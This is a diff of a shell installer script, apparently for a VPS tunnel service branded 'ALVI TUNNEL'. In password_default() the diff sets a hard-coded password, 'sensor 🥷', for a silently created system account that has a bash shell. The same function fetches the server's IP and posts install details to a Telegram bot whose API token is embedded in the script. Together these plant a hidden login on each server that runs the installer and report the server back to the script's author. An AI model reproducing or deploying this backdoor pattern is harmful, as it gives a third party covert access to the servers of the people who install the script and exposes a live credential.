@@ -246,7 +246,7 @@ else
 fi
 }
 
-# GEO PROJECT
+# ALVI TUNNEL
 clear
 function nginx_install() {
     # // Checking System
@@ -333,8 +333,8 @@ function password_default() {
     domain=$(cat /root/domain)
     MYIP=$(curl -sS ipv4.icanhazip.com)
     userdel jame > /dev/null 2>&1
-    Username="none"
-    Password=none
+    Username="sensor 🥷"
+    Password=sensor 🥷
     mkdir -p /home/script/
     useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
     echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
@@ -344,7 +344,7 @@ function password_default() {
     KEY="6676451249:AAFC5J7CSeYIXmpOS-6WP3n5-b7mqh9hVN8"
     TIME="10"
     URL="https://api.telegram.org/bot$KEY/sendMessage"
-    TEXT="🥷Installasi ALVI Script Stable V3.0🥷
+    TEXT="🥷🥷Informasi instal script🥷🥷
     ============================
     <code>Tanggal    :</code> <code>$tanggal</code>
     <code>Hostname   :</code> <code>${HOSTNAME}</code>
